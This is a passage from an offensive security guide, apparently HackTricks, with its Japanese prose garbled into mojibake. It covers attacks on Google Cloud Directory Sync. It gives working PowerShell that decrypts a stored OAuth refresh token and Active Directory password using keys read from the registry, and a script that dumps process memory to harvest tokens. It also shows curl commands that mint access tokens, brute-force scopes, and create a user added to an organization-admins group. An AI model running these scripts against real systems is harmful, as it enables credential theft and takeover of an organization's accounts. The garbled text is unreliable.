[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ã¯**GCDS**ã‚’æ¤œå‡ºã—ã€æ§‹æˆã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚„æš—å·åŒ–ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±**ã•ãˆã‚‚å–å¾—ã§ãã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

ã¾ãŸã€GCDSã¯ADã‹ã‚‰Workspaceã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’åŒæœŸã—ãªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ä½•ã‹ã‚ã‚Œã°ã€Workspaceã§æ–°ã—ãä½œæˆã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã«ãƒ©ãƒ³ãƒ€ãƒ ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã ã‘ã§ã™ã€‚ä»¥ä¸‹ã®ç”»åƒã®ã‚ˆã†ã«:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Disk Tokens & AD Credentials

ãƒã‚¤ãƒŠãƒª`config-manager.exe`ï¼ˆGUIã‚’æŒã¤ä¸»è¦ãªGCDSãƒã‚¤ãƒŠãƒªï¼‰ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§**`C:\Program Files\Google Cloud Directory Sync`**ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼å†…ã®**`Untitled-1.xml`**ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ã«æ§‹æˆã•ã‚ŒãŸã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®è³‡æ ¼æƒ…å ±ã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã€ãŠã‚ˆã³ã‚¢ã‚¯ã‚»ã‚¹ã‚’ä¿å­˜ã—ã¾ã™ã€‚ãŸã ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®`Documents`ã‚„**ä»–ã®ä»»æ„ã®ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼**ã«ä¿å­˜ã•ã‚Œã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚

ã•ã‚‰ã«ã€ãƒ¬ã‚¸ã‚¹ãƒˆãƒª**`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`**å†…ã®ã‚­ãƒ¼**`open.recent`**ã«ã¯ã€æœ€è¿‘é–‹ã‹ã‚ŒãŸã™ã¹ã¦ã®æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆxmlï¼‰ã®ãƒ‘ã‚¹ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**ãã‚Œã‚’ç¢ºèªã—ã¦è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**ã€‚

ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®æœ€ã‚‚èˆˆå‘³æ·±ã„æƒ…å ±ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€**refresh** **token** ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**password**ã¯ã€**AES CBC**ã‚’ä½¿ç”¨ã—ã¦ãƒ©ãƒ³ãƒ€ãƒ ã«ç”Ÿæˆã•ã‚ŒãŸã‚­ãƒ¼ã¨IVã§**encrypted**ã•ã‚Œã€**`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`**ã«ä¿å­˜ã•ã‚Œã¦ã„ã¾ã™ï¼ˆ**`prefs`** Javaãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒè¨­å®šã‚’ä¿å­˜ã™ã‚‹å ´æ‰€ï¼‰ã§ã€æ–‡å­—åˆ—ã‚­ãƒ¼**`/Encryption/Policy/V2.iv`**ã¨**`/Encryption/Policy/V2.key`**ã«base64å½¢å¼ã§ä¿å­˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

<details>

<summary>refresh tokenã¨passwordã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã®Powershellã‚¹ã‚¯ãƒªãƒ—ãƒˆ</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
ã“ã®æƒ…å ±ã¯ã€**`C:\Program Files\Google Cloud Directory Sync`** ã® **`DirSync.jar`** ã®javaã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã—ã€`exportkeys`ã¨ã„ã†æ–‡å­—åˆ—ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã§ç¢ºèªå¯èƒ½ã§ã™ï¼ˆã“ã‚Œã¯ãƒã‚¤ãƒŠãƒª **`upgrade-config.exe`** ãŒã‚­ãƒ¼ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ãŸã‚ã«æœŸå¾…ã™ã‚‹cliãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§ã™ï¼‰ã€‚
{% endhint %}

PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ä»£ã‚ã‚Šã«ã€ãƒã‚¤ãƒŠãƒª **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** ã‚’ä½¿ç”¨ã—ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ `-exportKeys` ã‚’æŒ‡å®šã—ã¦ã€ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‹ã‚‰ **Key** ã¨ **IV** ã‚’16é€²æ•°ã§å–å¾—ã—ã€ãã®å¾Œã€AES/CBCã¨ãã®ã‚­ãƒ¼ãŠã‚ˆã³IVã‚’ä½¿ç”¨ã—ã¦æƒ…å ±ã‚’å¾©å·åŒ–ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

### GCDS - ãƒ¡ãƒ¢ãƒªã‹ã‚‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒ€ãƒ³ãƒ—

GCPWã¨åŒæ§˜ã«ã€`config-manager.exe` ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ¡ãƒ¢ãƒªã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼ˆã“ã‚Œã¯GCDSã®GUIã‚’æŒã¤ãƒ¡ã‚¤ãƒ³ãƒã‚¤ãƒŠãƒªã®åå‰ã§ã™ï¼‰ã®ã§ã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¨ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã™ã§ã«ç”Ÿæˆã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰ã€‚\
ADã«è¨­å®šã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚‚è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã¨æ€ã„ã¾ã™ã€‚

<details>

<summary>config-manager.exeãƒ—ãƒ­ã‚»ã‚¹ã‚’ãƒ€ãƒ³ãƒ—ã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œç´¢</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹

ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§æŒ‡å®šã•ã‚ŒãŸã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆIDã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - ã‚¹ã‚³ãƒ¼ãƒ—

{% hint style="info" %}
ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŒã£ã¦ã„ã¦ã‚‚ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã®ãŸã‚ã«ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹**ã‚¹ã‚³ãƒ¼ãƒ—ã®ã¿ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ãã‚‹**ã‹ã‚‰ã§ã™ã€‚

ã¾ãŸã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã™ã¹ã¦ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§æœ‰åŠ¹ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€GCSDã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã™ã¹ã¦ã®å¯èƒ½ãªOAuthã‚¹ã‚³ãƒ¼ãƒ—ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ãŸã‚ã€æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€`refresh_token`ã‚’ä½¿ç”¨ã—ã¦`access_token`ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã‚¹ã‚³ãƒ¼ãƒ—ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

<details>

<summary>ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã®Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆ</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ãã—ã¦ã€åŸ·ç­†æ™‚ã«å¾—ã‚‰ã‚ŒãŸå‡ºåŠ›ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã€`gcp-organization-admins` ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã—ã¦ GCP ã§ã®æ¨©é™æ˜‡æ ¼ã‚’è©¦ã¿ã‚‹
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«Super Adminãƒ­ãƒ¼ãƒ«ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€**ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã«å¿…è¦ãªã‚¹ã‚³ãƒ¼ãƒ—ãŒä¸è¶³ã—ã¦ã„ã‚‹**ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

## ç®¡ç†è€…ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªåŒæœŸ

GCDSã‚’ä½¿ç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åŒæœŸã™ã‚‹æ–¹æ³•ã¨ã®ä¸»ãªé•ã„ã¯ã€GCDSã¯æ‰‹å‹•ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹ãƒã‚¤ãƒŠãƒªã‚’ä½¿ç”¨ã™ã‚‹ã®ã«å¯¾ã—ã€**ç®¡ç†è€…ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªåŒæœŸã¯ã‚µãƒ¼ãƒãƒ¼ãƒ¬ã‚¹**ã§ã€GoogleãŒç®¡ç†ã—ã¦ã„ã¾ã™ [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories)ã€‚

ã“ã®åŸ·ç­†æ™‚ç‚¹ã§ã€ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã¯ãƒ™ãƒ¼ã‚¿ç‰ˆã§ã‚ã‚Šã€2ç¨®é¡ã®åŒæœŸã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ï¼š**Active Directory**ã‹ã‚‰ã¨**Azure Entra ID**ã‹ã‚‰ï¼š

* **Active Directory:** ã“ã‚Œã‚’è¨­å®šã™ã‚‹ã«ã¯ã€**Googleã«ã‚ãªãŸã®Active Directoryç’°å¢ƒã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚Googleã¯GCPãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ï¼ˆ**VPCã‚³ãƒã‚¯ã‚¿**ã‚’ä»‹ã—ã¦ï¼‰ã«ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãŸã‚ã€ã‚³ãƒã‚¯ã‚¿ã‚’ä½œæˆã—ã€ãã®ã‚³ãƒã‚¯ã‚¿ã‹ã‚‰ADã‚’åˆ©ç”¨å¯èƒ½ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã¯ã€GCPãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®VMã«é…ç½®ã™ã‚‹ã‹ã€Cloud VPNã¾ãŸã¯Cloud Interconnectã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ãã®å¾Œã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«å¯¾ã™ã‚‹èª­ã¿å–ã‚Šã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã¤ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®**è³‡æ ¼æƒ…å ±**ã¨ã€**LDAPS**ã‚’ä»‹ã—ã¦é€£çµ¡ã™ã‚‹ãŸã‚ã®**è¨¼æ˜æ›¸**ã‚’æä¾›ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* **Azure Entra ID:** ã“ã‚Œã‚’æ§‹æˆã™ã‚‹ã«ã¯ã€ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã§è¡¨ç¤ºã•ã‚Œã‚‹Googleã®æŒ‡ç¤ºã«å¾“ã£ã¦ã€**èª­ã¿å–ã‚Šã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§Azureã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹**ã ã‘ã§ã™ã€‚Googleã¯Entra IDã«å¯¾ã™ã‚‹èª­ã¿å–ã‚Šã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã¤ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä¿æŒã—ã¾ã™ã€‚

æ­£ã—ãæ§‹æˆã•ã‚Œã‚‹ã¨ã€ä¸¡æ–¹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯**Workspaceã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚°ãƒ«ãƒ¼ãƒ—ã‚’åŒæœŸã™ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ãŒã€Workspaceã‹ã‚‰ADã¾ãŸã¯EntraIDã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚°ãƒ«ãƒ¼ãƒ—ã‚’æ§‹æˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚

ã“ã®åŒæœŸä¸­ã«è¨±å¯ã•ã‚Œã‚‹ä»–ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ãŸã‚ã®ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡
* å½¼ã‚‰ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’Workspaceã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚‚ã®ã«è‡ªå‹•çš„ã«å¤‰æ›´ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€WorkspaceãŒ`@hacktricks.xyz`ã‚’ä½¿ç”¨ã—ã€EntraIDãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ`@carloshacktricks.onmicrosoft.com`ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€`@hacktricks.xyz`ãŒã‚¢ã‚«ã‚¦ãƒ³ãƒˆå†…ã§ä½œæˆã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* åŒæœŸã•ã‚Œã‚‹**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å«ã‚€ã‚°ãƒ«ãƒ¼ãƒ—**ã‚’é¸æŠã—ã¾ã™ã€‚
* Workspaceã§åŒæœŸãŠã‚ˆã³ä½œæˆã™ã‚‹**ã‚°ãƒ«ãƒ¼ãƒ—**ã‚’é¸æŠã—ã¾ã™ï¼ˆã¾ãŸã¯ã™ã¹ã¦ã®ã‚°ãƒ«ãƒ¼ãƒ—ã‚’åŒæœŸã™ã‚‹ã‚ˆã†ã«æŒ‡ç¤ºã—ã¾ã™ï¼‰ã€‚

### AD/EntraID -> Google Workspace (& GCP)

ADã¾ãŸã¯EntraIDã‚’ä¾µå®³ã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€Google Workspaceã¨åŒæœŸã•ã‚Œã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚°ãƒ«ãƒ¼ãƒ—ã‚’å®Œå…¨ã«åˆ¶å¾¡ã§ãã¾ã™ã€‚\
ãŸã ã—ã€Workspaceã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä½¿ç”¨ã—ã¦ã„ã‚‹**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã¯**åŒã˜ã‚‚ã®ã§ã‚ã‚‹å¯èƒ½æ€§ã‚‚ã‚ã‚Œã°ã€ãã†ã§ãªã„å¯èƒ½æ€§ã‚‚ã‚ã‚Šã¾ã™**ã€‚

#### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¸ã®æ”»æ’ƒ

